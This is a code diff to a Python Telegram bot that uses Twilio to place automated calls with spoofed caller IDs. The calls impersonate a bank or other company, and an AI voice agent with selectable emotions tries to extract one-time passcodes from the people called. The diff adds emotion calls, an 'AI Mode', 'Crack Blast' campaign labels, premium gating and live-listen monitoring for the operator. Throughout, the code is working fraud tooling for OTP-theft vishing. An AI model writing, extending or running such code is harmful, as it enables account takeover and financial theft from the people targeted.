@@ -2352,6 +2352,147 @@ def _load_scheduled_params(user_id: str, schedule_id: str) -> Optional[dict]:
     return None
 
 
+def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotion: str = "neutral", status_message_id: Optional[int] = None) -> None:
+    """Start an AI Emotion Call with specified emotion via Media Stream + Groq.
+    
+    Emotion options: neutral, cheerful, angry, fear, surprise
+    Routes through /ai_start → Media Stream WebSocket → Groq with emotion-modulated responses
+    """
+    try:
+        ensure_user_path(user_id_str)
+        phonenum = normalize_phone_number(read_user_file(user_id_str, "phonenum.txt", ""))
+        if not phonenum or not is_valid_e164(phonenum):
+            bot.send_message(chat_id, "❌ Invalid or missing target phone number.")
+            return
+
+        caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip() or TWILIO_PHONE_NUMBER
+        emotion = emotion.lower() if emotion else "neutral"
+        bot.send_message(chat_id, f"🎭 Starting AI Emotion Call ({emotion}). Live listen will be available shortly.")
+
+        def _start():
+            try:
+                from config import USE_AI_FLOW, DEFAULT_VOICE_ID
+                
+                name = read_user_file(user_id_str, "Name.txt", "Customer")
+                company = read_user_file(user_id_str, "Company Name.txt", "your bank")
+                voice_id = read_user_file(user_id_str, "Voice.txt", DEFAULT_VOICE_ID)
+                code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
+                
+                if USE_AI_FLOW:
+                    webhook_url = (
+                        f"{NGROK_URL.rstrip('/')}/ai_start"
+                        f"?user_id={quote_plus(str(user_id_str))}"
+                        f"&chat_id={quote_plus(str(chat_id))}"
+                        f"&name={quote_plus(name)}"
+                        f"&company={quote_plus(company)}"
+                        f"&voice_id={quote_plus(voice_id)}"
+                        f"&emotion={quote_plus(emotion)}"
+                        f"&code_length={quote_plus(code_length)}"
+                        f"&call_type=emotion"
+                        f"&mode_label=AI%20Emotion%20Call"
+                    )
+                else:
+                    bot.send_message(chat_id, "❌ AI flow is disabled. Cannot start emotion call.")
+                    return
+                
+                sid = make_spoofed_call(
+                    to=phonenum,
+                    from_number=TWILIO_PHONE_NUMBER,
+                    caller_id=caller_id,
+                    webhook_url=webhook_url,
+                    user_id=user_id_str,
+                    chat_id=chat_id,
+                    call_record=True,
+                )
+                if not sid:
+                    raise Exception("Failed to create emotion call")
+
+                resolved_sid = None
+                try:
+                    if hasattr(sid, "result") and callable(getattr(sid, "result")):
+                        resolved_sid = sid.result(timeout=5)
+                    else:
+                        resolved_sid = sid
+                except Exception:
+                    resolved_sid = None
+
+                user_obj = types.User(id=call_from_user.id, is_bot=False, first_name=read_user_file(user_id_str, "Name.txt") or "User")
+                if resolved_sid:
+                    register_call_session(
+                        resolved_sid,
+                        user_id_str,
+                        chat_id=chat_id,
+                        endpoint="/initiate_emotion_call",
+                        mode_label=f"AI Emotion Call ({emotion})",
+                        status_chat_id=chat_id,
+                        status_message_id=status_message_id,
+                    )
+                    store_call_metadata(user_id_str, resolved_sid, target=phonenum)
+                    live_buttons = types.InlineKeyboardMarkup(row_width=1)
+                    live_buttons.add(types.InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen"))
+                    bot.send_message(chat_id, "🎯 Emotion call started. Tap LIVE LISTEN to open the monitoring panel.", reply_markup=live_buttons)
+                    try:
+                        _http.post(
+                            f"{LIVE_LISTEN_URL}/conversation/start",
+                            json={"call_sid": resolved_sid, "chat_id": chat_id},
+                            timeout=REQ_TIMEOUT,
+                        )
+                    except Exception:
+                        pass
+                else:
+                    bot.send_message(chat_id, "🎯 Emotion call queued. You'll be notified when it starts.")
+                    try:
+                        if hasattr(sid, "add_done_callback") and callable(getattr(sid, "add_done_callback")):
+                            def _finalize_call(fut):
+                                try:
+                                    final_sid = fut.result()
+                                except Exception:
+                                    return
+                                try:
+                                    register_call_session(
+                                        final_sid,
+                                        user_id_str,
+                                        chat_id=chat_id,
+                                        endpoint="/initiate_emotion_call",
+                                        mode_label=f"AI Emotion Call ({emotion})",
+                                        status_chat_id=chat_id,
+                                        status_message_id=status_message_id,
+                                    )
+                                except Exception:
+                                    pass
+                                try:
+                                    store_call_metadata(user_id_str, final_sid, target=phonenum)
+                                except Exception:
+                                    pass
+                                try:
+                                    _http.post(
+                                        f"{LIVE_LISTEN_URL}/conversation/start",
+                                        json={"call_sid": final_sid, "chat_id": chat_id},
+                                        timeout=REQ_TIMEOUT,
+                                    )
+                                except Exception:
+                                    pass
+                                try:
+                                    report_twilio_call_status(chat_id, final_sid, user=user_obj)
+                                except Exception:
+                                    pass
+                            sid.add_done_callback(_finalize_call)
+                    except Exception:
+                        pass
+            except Exception as e:
+                try:
+                    bot.send_message(chat_id, f"❌ Failed to initiate emotion call: {e}")
+                except Exception:
+                    pass
+
+        run_callback_async(_start)
+    except Exception:
+        try:
+            bot.send_message(chat_id, "❌ Could not start AI Emotion Call due to internal error.")
+        except Exception:
+            pass
+
+
 def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_message_id: Optional[int] = None, mode_label: Optional[str] = None) -> None:
     """Start a Normal Call that always uses the single ultimate script endpoints.
 
@@ -2924,6 +3065,7 @@ def recording_callback():
 def ai_start():
     """
     Entry point for AI-driven calls using Media Streams.
+    Supports all call types: Normal, Manual, Custom, AI Emotion, Crack Blast.
     Receives Twilio call and starts Media Stream WebSocket.
     
     Query parameters:
@@ -2932,9 +3074,11 @@ def ai_start():
     - name: Target name
     - company: Company name
     - voice_id: ElevenLabs voice ID
-    - emotion: Voice emotion (optional)
-    - custom_script: Custom script (optional, overrides system prompt)
+    - emotion: Voice emotion (neutral, angry, calm, urgent)
+    - custom_script: Custom script (for Manual/Custom call, overrides default system prompt)
     - code_length: OTP code length (optional, defaults to 6)
+    - call_type: Call type (normal, manual, custom, emotion, crack_blast) - auto-detected if not provided
+    - mode_label: Display label for UI
     """
     from config import USE_AI_FLOW, NGROK_URL, DEFAULT_VOICE_ID, SYSTEM_PROMPT
     from urllib.parse import quote_plus
@@ -2947,16 +3091,17 @@ def ai_start():
     emotion = request.values.get("emotion") or request.args.get("emotion", "neutral")
     custom_script = request.values.get("custom_script") or request.args.get("custom_script")
     code_length = request.values.get("code_length") or request.args.get("code_length", "6")
+    call_type = request.values.get("call_type") or request.args.get("call_type", "normal")
+    mode_label = request.values.get("mode_label") or request.args.get("mode_label", "AI Call")
     call_sid = request.values.get("CallSid", "")
     
-    logger.info(f"[AI_START] Call {call_sid[:8] if call_sid else 'unknown'} for user {user_id}")
+    logger.info(f"[AI_START] Call {call_sid[:8] if call_sid else 'unknown'} type={call_type} user={user_id}")
     
     if not user_id:
         return Response("Missing user_id", status=400)
     
     if not USE_AI_FLOW:
-        logger.error(f"[AI_START] CRITICAL: /ai_start called but USE_AI_FLOW=false. Routing error!")
-        logger.error(f"[AI_START] CallSid={call_sid}, user_id={user_id}")
+        logger.error(f"[AI_START] CRITICAL: /ai_start called but USE_AI_FLOW=false")
         return Response("AI flow is disabled in config", status=400)
     
     session = None
@@ -2967,17 +3112,27 @@ def ai_start():
             return Response("Missing CallSid", status=400)
         
         session = get_session(call_sid)
+        
+        # Initialize session with all call type data
         session.name = name or read_user_file(user_id, "Name.txt", "Customer")
         session.company = company or read_user_file(user_id, "Company Name.txt", "your bank")
         session.voice_id = voice_id or read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
-        session.emotion = emotion
+        session.emotion = emotion.lower() if emotion else "neutral"
         session.chat_id = int(chat_id) if chat_id else None
-        session.custom_script = custom_script
+        session.custom_script = custom_script  # Used as override system prompt for Manual/Custom/Emotion
+        session.call_type = call_type
+        session.mode_label = mode_label
+        
         try:
             session.code_length = int(code_length)
         except (ValueError, TypeError):
             session.code_length = 6
-        logger.warning(f"[AI_START] OK - AI Session initialized: CallSid={call_sid[:8]}, user={user_id}, code_len={session.code_length}, emotion={emotion}")
+        
+        logger.warning(
+            f"[AI_START] ✅ Session initialized: "
+            f"CallSid={call_sid[:8]}, type={call_type}, emotion={session.emotion}, "
+            f"code_len={session.code_length}, voice={session.voice_id}"
+        )
     except ImportError as e:
         logger.error(f"[AI_START] CRITICAL: Cannot import ai.session - {e}")
         return Response("AI modules not installed", status=500)
@@ -2989,8 +3144,14 @@ def ai_start():
         logger.error(f"[AI_START] CRITICAL: Session is None after initialization")
         return Response("Session initialization failed", status=500)
     
-    # Register call in session tracking
-    register_call_session(call_sid, user_id, chat_id=int(chat_id) if chat_id else None, endpoint="/ai_start", mode_label="AI Call")
+    # Register call in session tracking with proper mode_label
+    register_call_session(
+        call_sid,
+        user_id,
+        chat_id=int(chat_id) if chat_id else None,
+        endpoint="/ai_start",
+        mode_label=mode_label
+    )
     
     # Build TwiML: start the Media Stream
     resp = VoiceResponse()
@@ -3001,16 +3162,17 @@ def ai_start():
     start.stream(url=stream_url)
     resp.append(start)
     
-    # Optional welcome message (AI will take over quickly)
-    resp.say("Please wait while we connect you to a security agent.")
+    # Brief welcome - AI takes over immediately via WebSocket
+    welcome_msg = f"Please wait while we connect you to {session.company}."
+    resp.say(welcome_msg)
     
     if chat_id:
         try:
-            bot.send_message(int(chat_id), "🤖 AI call starting. Live listen active.")
+            bot.send_message(int(chat_id), f"🤖 {mode_label} started with AI. Live listen active.")
         except Exception:
             pass
     
-    logger.info(f"[AI_START] Starting Media Stream: {call_sid}")
+    logger.info(f"[AI_START] ✅ Starting Media Stream for {mode_label}: {call_sid}")
     return Response(str(resp), content_type="application/xml")
 
 @app.route("/voice", methods=["POST"])
@@ -4028,6 +4190,8 @@ def launch_crackblast_campaign(user_id: str, chat_id: int) -> None:
                 f"&voice_id={quote_plus(voice_id)}"
                 f"&custom_script={quote_plus(script)}"
                 f"&code_length={quote_plus(code_length)}"
+                f"&call_type=crack_blast"
+                f"&mode_label=Crack%20Blast"
             )
         else:
             webhook_url = (
@@ -4742,6 +4906,8 @@ def _handle_query_processing(call, _):
                         f"&voice_id={quote_plus(voice_id)}"
                         f"&custom_script={quote_plus(script)}"
                         f"&code_length={quote_plus(code_length)}"
+                        f"&call_type=manual"
+                        f"&mode_label=Manual%20Call"
                     )
                 else:
                     webhook_url = f"{NGROK_URL.rstrip('/')}/manual_flow?user_id={quote_plus(str(user_id_str))}&chat_id={quote_plus(str(chat_id))}"
@@ -4876,6 +5042,8 @@ def _handle_query_processing(call, _):
                         f"&voice_id={quote_plus(voice_id)}"
                         f"&custom_script={quote_plus(script)}"
                         f"&code_length={quote_plus(code_length)}"
+                        f"&call_type=custom"
+                        f"&mode_label=Custom%20Call"
                     )
                 else:
                     webhook_url = f"{NGROK_URL.rstrip('/')}/voice?user_id={quote_plus(str(user_id_str))}&chat_id={quote_plus(str(chat_id))}&custom=1&audio=custom_script"
@@ -5166,12 +5334,24 @@ def _handle_query_processing(call, _):
 
     # --- AI Mode ---
     if call.data == "ai_mode":
-        if not is_premium_user(user_id_str):
+        if not is_full_premium_user(user_id_str):
             alert_msg = "🧠 AI MODE requires Premium Access\n\nAdvanced AI voice processing and intelligent conversation handling are exclusive to premium members.\n\nUpgrade in SHOP to unlock unlimited AI-powered calls."
             bot.answer_callback_query(call.id, alert_msg, show_alert=True)
             bot.send_message(chat_id, f"❌ {alert_msg}", parse_mode="HTML")
             return
-        bot.send_message(chat_id, "🧠 AI MODE V2\n\nThis mode is available to premium subscribers. Visit SHOP if you need to upgrade.")
+        
+        # AI MODE is a variant of Normal Call with enhanced AI responsiveness
+        ensure_user_path(user_id_str)
+        
+        # Check if phone number is set
+        phone = normalize_phone_number(read_user_file(user_id_str, "phonenum.txt", ""))
+        if not phone or not is_valid_e164(phone):
+            set_user_state(user_id_str, "ai_mode_awaiting_phone")
+            bot.send_message(chat_id, "🧠 <b>AI MODE</b>\n\nEnter target phone number:\n(Format: +1234567890)", parse_mode="HTML")
+            return
+        
+        # Phone is set, start AI call
+        initiate_normal_call(chat_id, user_id_str, call.from_user, mode_label="AI Mode")
         return
 
     # --- Crack Blast ---
@@ -6424,6 +6604,25 @@ def handle_stateful_text(message):
         bot.send_message(message.chat.id, summary, reply_markup=buttons)
         return
 
+    # AI Mode phone input
+    if state == "ai_mode_awaiting_phone":
+        if not is_full_premium_user(user_id_str):
+            clear_user_state(user_id_str)
+            bot.send_message(message.chat.id, "❌ Premium access required. AI MODE is available only to premium subscribers.")
+            return
+        
+        phonenum = normalize_phone_number(text.strip())
+        if not phonenum or not is_valid_e164(phonenum):
+            bot.send_message(message.chat.id, "❌ Invalid phone number. Use format: +1234567890")
+            return
+        
+        write_user_file(user_id_str, "phonenum.txt", phonenum)
+        clear_user_state(user_id_str)
+        
+        # Start AI Mode call
+        initiate_normal_call(message.chat.id, user_id_str, message.from_user, mode_label="AI Mode")
+        return
+
     # Custom script creation
     if state == "custom_call_awaiting":
         write_user_file(user_id_str, "custom_script.txt", text)
@@ -6507,7 +6706,34 @@ def handle_stateful_text(message):
             return
         write_user_file(user_id_str, "emotion.txt", emotion)
         clear_user_state(user_id_str)
-        bot.send_message(message.chat.id, f"🧠 Emotion set: {emotion.upper()}\nUse /normal to start the Professional Normal Call setup.")
+        
+        # Start AI Emotion Call directly
+        try:
+            set_user_state(user_id_str, "waiting_for_emotion_phone")
+            bot.send_message(
+                message.chat.id,
+                f"🧠 Emotion set to: <b>{emotion.upper()}</b>\n\n"
+                "Now send the target's phone number to start the call.\n"
+                "Format: +1234567890",
+                parse_mode="HTML"
+            )
+        except Exception as e:
+            logger.error(f"Error setting up emotion call: {e}")
+            bot.send_message(message.chat.id, "❌ Error setting up emotion call.")
+        return
+    
+    # Get phone number for emotion call
+    if state == "waiting_for_emotion_phone":
+        phonenum = normalize_phone_number(text.strip())
+        if not phonenum or not is_valid_e164(phonenum):
+            bot.send_message(message.chat.id, "❌ Invalid phone number. Please use format: +1234567890")
+            return
+        write_user_file(user_id_str, "phonenum.txt", phonenum)
+        clear_user_state(user_id_str)
+        
+        # Initiate emotion call
+        emotion = read_user_file(user_id_str, "emotion.txt", "neutral").strip() or "neutral"
+        initiate_emotion_call(message.chat.id, user_id_str, message.from_user, emotion=emotion)
         return
 
     # Payment proof - text submission
